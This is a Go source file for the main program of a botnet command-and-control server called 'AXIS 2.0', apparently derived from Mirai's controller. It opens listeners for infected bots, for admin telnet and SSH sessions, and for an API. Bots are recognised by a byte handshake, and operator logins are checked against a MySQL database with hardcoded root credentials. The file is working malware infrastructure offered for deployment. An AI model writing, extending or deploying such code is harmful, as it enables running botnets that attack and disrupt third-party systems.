package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"errors"
	"fmt"
	"net"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)

// ============================================================================
// CONFIGURATION - Change these values to match your infrastructure
// ============================================================================
const DatabaseAddr string = "127.0.0.1:3306"
const DatabaseUser string = "root"
const DatabasePass string = "root"
const DatabaseTable string = "AXIS2"

// C&C Server listen address (0.0.0.0 for all interfaces)
const CNCListenAddr string = "0.0.0.0:3778"

// SSH Server listen address (set to empty string to disable SSH)
const SSHListenAddr string = "0.0.0.0:2222"

// SSH Host Key file path (will be auto-generated if not exists)
const SSHHostKeyPath string = "ssh_host_key"

// API Server listen address (set to empty string to disable API)
const APIListenAddr string = "0.0.0.0:3779"

// ============================================================================

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
	// Start C&C server for bot connections
	tel, err := net.Listen("tcp", CNCListenAddr)
	if err != nil {
		fmt.Printf("Failed to start C&C server: %v\n", err)
		return
	}

	// Start SSH server for admin connections
	if SSHListenAddr != "" {
		signer, err := getOrCreateSSHHostKey()
		if err != nil {
			fmt.Printf("Failed to load SSH host key: %v\n", err)
			return
		}

		sshConfig := &ssh.ServerConfig{
			PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
				// Validate credentials against database
				if database.ValidateCredentials(c.User(), string(pass)) {
					return &ssh.Permissions{Extensions: map[string]string{"username": c.User()}}, nil
				}
				return nil, fmt.Errorf("invalid credentials")
			},
		}
		sshConfig.AddHostKey(signer)

		sshListener, err := net.Listen("tcp", SSHListenAddr)
		if err != nil {
			fmt.Printf("Failed to start SSH server: %v\n", err)
			return
		}

		go func() {
			fmt.Printf("AXIS 2.0 SSH Server listening on %s\n", SSHListenAddr)
			for {
				conn, err := sshListener.Accept()
				if err != nil {
					fmt.Printf("Failed to accept SSH connection: %v\n", err)
					break
				}
				go handleSSHConnection(conn, sshConfig)
			}
		}()
	}

	// Start API server if configured
	if APIListenAddr != "" {
		api, err := net.Listen("tcp", APIListenAddr)
		if err != nil {
			fmt.Printf("Failed to start API server: %v\n", err)
			return
		}

		go func() {
			for {
				conn, err := api.Accept()
				if err != nil {
					break
				}
				go apiHandler(conn)
			}
		}()
	}

	fmt.Printf("AXIS 2.0 C&C Server listening on %s\n", CNCListenAddr)

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	// Bot connections start with 4 bytes where first 3 are 0x00
	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			NewBot(conn, buf[3], source).Handle()
		} else {
			NewBot(conn, buf[3], "").Handle()
		}
	} else {
		// Admin telnet session
		NewAdmin(conn).Handle()
	}
}

func apiHandler(conn net.Conn) {
	defer conn.Close()
	NewApi(conn).Handle()
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}

// getOrCreateSSHHostKey loads or generates an SSH host key
func getOrCreateSSHHostKey() (ssh.Signer, error) {
	// Try to read existing key
	keyBytes, err := os.ReadFile(SSHHostKeyPath)
	if err == nil {
		signer, err := ssh.ParsePrivateKey(keyBytes)
		if err == nil {
			return signer, nil
		}
	}

	// Generate new key
	fmt.Println("Generating new SSH host key...")
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	// Encode to PEM
	privateKeyPEM := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	}

	// Save to file
	keyBytes = pem.EncodeToMemory(privateKeyPEM)
	if err := os.WriteFile(SSHHostKeyPath, keyBytes, 0600); err != nil {
		return nil, err
	}

	// Parse and return signer
	signer, err := ssh.ParsePrivateKey(keyBytes)
	if err != nil {
		return nil, err
	}

	return signer, nil
}

// handleSSHConnection handles SSH admin connections
func handleSSHConnection(conn net.Conn, sshConfig *ssh.ServerConfig) {
	// Perform SSH handshake
	sshConn, chans, reqs, err := ssh.NewServerConn(conn, sshConfig)
	if err != nil {
		fmt.Printf("Failed SSH handshake: %v\n", err)
		conn.Close()
		return
	}
	defer sshConn.Close()

	// Discard global requests
	go ssh.DiscardRequests(reqs)

	// Accept channels
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			continue
		}

		go func(channel ssh.Channel, requests <-chan *ssh.Request) {
			defer channel.Close()

			// Handle session requests
			go ssh.DiscardRequests(requests)

			// Create admin session
			admin := NewAdminSSH(channel, sshConn, sshConn.User())
			admin.Handle()
		}(channel, requests)
	}
}
